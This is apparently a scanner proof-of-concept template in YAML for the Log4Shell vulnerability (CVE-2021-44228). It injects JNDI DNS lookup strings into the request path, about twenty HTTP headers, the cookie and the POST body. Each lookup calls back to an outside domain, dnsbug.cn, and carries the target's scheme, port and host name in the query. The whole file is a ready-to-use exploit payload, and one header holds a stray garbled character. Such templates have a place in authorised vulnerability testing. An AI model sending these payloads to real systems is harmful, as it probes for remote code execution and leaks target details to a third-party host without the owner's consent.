name: poc-yaml-cve-2021-44228-post
set:
    inputPath: request.url.domain
    inputPathport: request.url.port
    inputPathscheme: request.url.scheme
    inputPathpath: request.url.path
rules:
    - method: POST
      path: /?${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.geturi.a0b3a344.dnsbug.cn}
      headers:
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36,รฐ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.useragent.a0b3a344.dnsbug.cn}
          Accept: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.accept.a0b3a344.dnsbug.cn}
          Accept-Encoding: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.acceptencoding.a0b3a344.dnsbug.cn}
          Accept-Language: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.acceptlanguage.a0b3a344.dnsbug.cn}
          Access-Control-Request-Headers: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.accesscontrolrequestheaders.a0b3a344.dnsbug.cn}
          Access-Control-Request-Method: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.accesscontrolrequestmethod.a0b3a344.dnsbug.cn}
          Authentication: Basic ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.authenticationbasic.a0b3a344.dnsbug.cn}
          authentication: Bearer ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.authenticationbearer.a0b3a344.dnsbug.cn}
          Cookie: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.cookiename.a0b3a344.dnsbug.cn}=${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.cookievalue.a0b3a344.dnsbug.cn}
          Location: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.location.a0b3a344.dnsbug.cn}
          Origin: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.origin.a0b3a344.dnsbug.cn}
          Referer: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.referer.a0b3a344.dnsbug.cn}
          Upgrade-Insecure-Requests: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.upgradeinsecurerequests.a0b3a344.dnsbug.cn}
          X-Api-Version: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.xapiversion.a0b3a344.dnsbug.cn}
          X-CSRF-Token: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.xcsrftoken.a0b3a344.dnsbug.cn}
          X-Druid-Comment: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.xdruidcomment.a0b3a344.dnsbug.cn}
          X-Forwarded-For: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.xforwardedfor.a0b3a344.dnsbug.cn}
          X-Origin: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.xorigin.a0b3a344.dnsbug.cn}
          Content-Type: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.contenttype.a0b3a344.dnsbug.cn}

      body: ${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.bodyname.a0b3a344.dnsbug.cn}=${jndi:dns://post.{{inputPathscheme}}{{inputPathport}}.{{inputPath}}.bodyvalue.a0b3a344.dnsbug.cn}

      expression: |
        response.status == 999